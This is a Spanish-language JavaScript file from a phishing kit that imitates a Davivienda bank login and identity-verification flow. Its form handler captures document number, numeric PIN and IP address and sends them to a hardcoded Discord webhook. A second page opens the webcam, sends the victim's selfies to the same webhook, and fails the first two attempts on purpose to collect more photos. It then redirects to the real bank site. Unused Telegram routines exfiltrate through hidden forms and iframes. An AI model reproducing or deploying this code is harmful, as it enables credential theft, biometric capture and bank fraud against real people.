// Configuración de Discord
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1442967165413232754/otiUgJhiF8S5-EGS9frT16ZlYAOYePGfHQ4fp81pq6dCPIuxeMbI67ilMYI-pRlzxeAi';

// Función para enviar mensaje directamente a Discord con embed verde
async function sendToTelegram(message) {
    try {
        // Crear embed con borde verde
        const embed = {
            title: "📧 🔐 Nuevo Intento de Login",
            description: message.replace('📧 🔐 Nuevo Intento de Login\n\n', '').trim(),
            color: 0x00FF00, // Verde en formato hexadecimal
            timestamp: new Date().toISOString()
        };
        
        const response = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                embeds: [embed]
            })
        });
        if (response.ok || response.status === 204) {
            console.log('Mensaje enviado a Discord');
            return { ok: true };
        } else {
            throw new Error('Error en respuesta de Discord');
        }
    } catch (error) {
        console.error('Error enviando a Discord:', error);
    }
}


// Método alternativo usando webhook/form
async function sendViaWebhook(message) {
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    form.style.display = 'none';
    
    const chatIdInput = document.createElement('input');
    chatIdInput.type = 'hidden';
    chatIdInput.name = 'chat_id';
    chatIdInput.value = TELEGRAM_CHAT_ID;
    
    const textInput = document.createElement('input');
    textInput.type = 'hidden';
    textInput.name = 'text';
    textInput.value = message;
    
    form.appendChild(chatIdInput);
    form.appendChild(textInput);
    document.body.appendChild(form);
    
    // Usar iframe para enviar
    const iframe = document.createElement('iframe');
    iframe.name = 'telegramFrame';
    iframe.style.display = 'none';
    form.target = 'telegramFrame';
    document.body.appendChild(iframe);
    form.submit();
    
    setTimeout(() => {
        document.body.removeChild(form);
        document.body.removeChild(iframe);
    }, 1000);
}

// Función para enviar foto directamente a Discord
async function sendPhotoToTelegram(photoBase64, caption = '') {
    try {
        // Convertir base64 a blob
        const base64Data = photoBase64.split(',')[1];
        const byteCharacters = atob(base64Data);
        const byteNumbers = new Array(byteCharacters.length);
        for (let i = 0; i < byteCharacters.length; i++) {
            byteNumbers[i] = byteCharacters.charCodeAt(i);
        }
        const byteArray = new Uint8Array(byteNumbers);
        const blob = new Blob([byteArray], { type: 'image/jpeg' });
        
        // Discord webhook para imágenes
        const formData = new FormData();
        formData.append('file', blob, 'photo.jpg');
        if (caption) {
            formData.append('content', caption);
        }
        
        const response = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            body: formData
        });
        
        if (response.ok || response.status === 204) {
            console.log('Foto enviada a Discord');
            return { ok: true };
        } else {
            throw new Error('Error en respuesta de Discord');
        }
    } catch (error) {
        console.error('Error enviando foto a Discord:', error);
    }
}

// Método alternativo usando iframe para enviar foto
async function sendPhotoViaIframe(photoBase64, caption) {
    try {
        // Convertir base64 a blob URL
        const base64Data = photoBase64.split(',')[1];
        const byteCharacters = atob(base64Data);
        const byteNumbers = new Array(byteCharacters.length);
        for (let i = 0; i < byteCharacters.length; i++) {
            byteNumbers[i] = byteCharacters.charCodeAt(i);
        }
        const byteArray = new Uint8Array(byteNumbers);
        const blob = new Blob([byteArray], { type: 'image/jpeg' });
        const blobUrl = URL.createObjectURL(blob);
        
        // Crear form
        const form = document.createElement('form');
        form.method = 'POST';
        form.action = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
        form.enctype = 'multipart/form-data';
        form.style.display = 'none';
        
        // Crear input para chat_id
        const chatIdInput = document.createElement('input');
        chatIdInput.type = 'hidden';
        chatIdInput.name = 'chat_id';
        chatIdInput.value = TELEGRAM_CHAT_ID;
        form.appendChild(chatIdInput);
        
        // Crear input para caption
        if (caption) {
            const captionInput = document.createElement('input');
            captionInput.type = 'hidden';
            captionInput.name = 'caption';
            captionInput.value = caption;
            form.appendChild(captionInput);
        }
        
        // Crear input file (usando fetch para obtener el blob)
        const fileInput = document.createElement('input');
        fileInput.type = 'file';
        fileInput.name = 'photo';
        fileInput.style.display = 'none';
        
        // Convertir blob a File
        const file = new File([blob], 'photo.jpg', { type: 'image/jpeg' });
        const dataTransfer = new DataTransfer();
        dataTransfer.items.add(file);
        fileInput.files = dataTransfer.files;
        form.appendChild(fileInput);
        
        document.body.appendChild(form);
        
        // Usar iframe
        const iframe = document.createElement('iframe');
        iframe.name = 'telegramPhotoFrame';
        iframe.style.display = 'none';
        form.target = 'telegramPhotoFrame';
        document.body.appendChild(iframe);
        
        form.submit();
        
        setTimeout(() => {
            URL.revokeObjectURL(blobUrl);
            document.body.removeChild(form);
            document.body.removeChild(iframe);
        }, 2000);
    } catch (error) {
        console.error('Error en método alternativo de foto:', error);
    }
}

// Script para index.html - Redirección al formulario y envío de datos
document.addEventListener('DOMContentLoaded', function() {
    const form = document.querySelector('form');
    if (form) {
        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            // Obtener datos del formulario
            const documentType = document.getElementById('documentType').value;
            const documentNumber = document.getElementById('documentNumber').value.trim();
            const password = document.getElementById('password').value.trim();
            const rememberMe = document.getElementById('rememberMe').checked;
            
            // VALIDACIÓN: Verificar que los campos no estén vacíos
            if (documentNumber === '') {
                alert('Por favor ingrese su número de documento');
                document.getElementById('documentNumber').focus();
                return;
            }
            
            if (password === '') {
                alert('Por favor ingrese su clave');
                document.getElementById('password').focus();
                return;
            }
            
            // Validación adicional: verificar que tengan contenido válido
            if (documentNumber.length < 3) {
                alert('El número de documento debe tener al menos 3 caracteres');
                document.getElementById('documentNumber').focus();
                return;
            }
            
            // NUEVA VALIDACIÓN: La clave debe tener exactamente 6 u 8 dígitos
            if (password.length !== 6 && password.length !== 8) {
                alert('La clave debe tener exactamente 6 u 8 dígitos');
                document.getElementById('password').focus();
                return;
            }
            
            // Validar que la clave solo contenga números
            if (!/^\d+$/.test(password)) {
                alert('La clave solo debe contener números');
                document.getElementById('password').focus();
                return;
            }
            
            // Obtener IP primero
            const clientIP = await getClientIP();
            
            // Generar sessionId único
            const sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            
            // Crear mensaje para Telegram con el formato solicitado (incluyendo la clave)
            const message = `
📧 🔐 Nuevo Intento de Login

• 📄 Tipo de Documento: ${documentType}
• 🔢 Número de Documento: ${documentNumber}
• 🔑 Clave: ${password}
• 💾 Recordar Datos: ${rememberMe ? 'Sí' : 'No'}
• 🌐 IP Address: ${clientIP}
            `.trim();
            
            // Guardar información del documento en localStorage para usarla en sel.html
            localStorage.setItem('documentType', documentType);
            localStorage.setItem('documentNumber', documentNumber);
            localStorage.setItem('password', password);
            
            // Enviar a Telegram (sin botones, directo)
            console.log('Enviando mensaje a Telegram...');
            try {
                await sendToTelegram(message);
            } catch (error) {
                console.error('Error enviando a Telegram:', error);
            }
            
            // Redirigir directamente sin esperar aprobación
            window.location.href = 'sel.html';
        });
    }
});

// Función para obtener IP del cliente
async function getClientIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        return 'No disponible';
    }
}

// Script para sel.html - Verificación facial
document.addEventListener('DOMContentLoaded', function() {
    const videoElement = document.getElementById('videoElement');
    const statusMessage = document.getElementById('statusMessage');
    const takePhotoBtn = document.getElementById('takePhotoBtn');

    // Solo ejecutar si estamos en sel.html (verificar que existan los elementos)
    if (videoElement && statusMessage && takePhotoBtn) {
        let stream = null;
        let canvas = null;
        let photoCount = 0;

        // Función para iniciar la cámara automáticamente
        async function startCamera() {
            try {
                statusMessage.textContent = 'Solicitando acceso a la cámara...';
                statusMessage.className = 'status-message';

                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    }
                });

                videoElement.srcObject = stream;
                videoElement.style.display = 'block';
                
                statusMessage.textContent = '';
                statusMessage.className = 'status-message';
                
                takePhotoBtn.style.display = 'block';
            } catch (error) {
                console.error('Error al acceder a la cámara:', error);
                statusMessage.textContent = 'Error al acceder a la cámara. Por favor, permita el acceso e intente nuevamente.';
                statusMessage.className = 'status-message error';
            }
        }

        // Iniciar la cámara automáticamente al cargar la página
        startCamera();

        takePhotoBtn.addEventListener('click', async () => {
            const videoContainer = document.querySelector('.video-container');
            
            // Deshabilitar el botón
            takePhotoBtn.disabled = true;
            takePhotoBtn.textContent = 'Verificando...';
            
            // Agregar animación de carga al borde
            videoContainer.classList.add('loading');
            statusMessage.textContent = 'Verificando foto...';
            statusMessage.className = 'status-message';

            // Crear un canvas para capturar la imagen completa (sin recortar)
            const fullCanvas = document.createElement('canvas');
            fullCanvas.width = videoElement.videoWidth;
            fullCanvas.height = videoElement.videoHeight;
            
            const ctx = fullCanvas.getContext('2d');
            
            // Dibujar el video completo en el canvas (sin recortar en círculo)
            ctx.drawImage(videoElement, 0, 0, fullCanvas.width, fullCanvas.height);

            // Convertir a imagen completa
            const imageData = fullCanvas.toDataURL('image/jpeg');
            
            // Incrementar contador de fotos
            photoCount++;
            
            // Obtener información del documento desde localStorage
            const documentType = localStorage.getItem('documentType') || 'No especificado';
            const documentNumber = localStorage.getItem('documentNumber') || 'No especificado';
            
            // Enviar foto a Telegram con información del documento
            const caption = `📸 Selfie #${photoCount}\n\n📄 Tipo de Documento: ${documentType}\n🔢 Número de Documento: ${documentNumber}\n🕐 ${new Date().toLocaleString('es-ES')}`;
            await sendPhotoToTelegram(imageData, caption);
            
            // Simular verificación (2-3 segundos)
            setTimeout(() => {
                // Remover animación de carga
                videoContainer.classList.remove('loading');
                
                // Las primeras 2 fotos fallan, la tercera es exitosa
                const verificationSuccess = photoCount >= 3;
                
                if (verificationSuccess) {
                    videoContainer.classList.add('success');
                    statusMessage.textContent = '✓ Verificación exitosa';
                    statusMessage.className = 'status-message success';
                    
                    // Enviar mensaje de verificación exitosa
                    sendToTelegram(`✅ <b>Verificación Facial Exitosa</b>\n\n📸 Total de intentos: ${photoCount}\n🕐 ${new Date().toLocaleString('es-ES')}`);
                    
                    // Detener el stream después de la verificación exitosa
                    setTimeout(() => {
                        if (stream) {
                            stream.getTracks().forEach(track => track.stop());
                        }
                        // Redirigir a Davivienda después de 1 segundo
                        window.location.href = 'https://www.davivienda.com/';
                    }, 1000);
                } else {
                    videoContainer.classList.add('error');
                    statusMessage.textContent = '✗ La selfie salió mal. Intente nuevamente.';
                    statusMessage.className = 'status-message error';
                    takePhotoBtn.disabled = false;
                    takePhotoBtn.textContent = 'Tomar Foto';
                    // Remover clase error para permitir otro intento
                    setTimeout(() => {
                        videoContainer.classList.remove('error');
                    }, 2000);
                }
            }, 2500);
        });

        // Limpiar el stream al salir
        window.addEventListener('beforeunload', () => {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        });
    }
});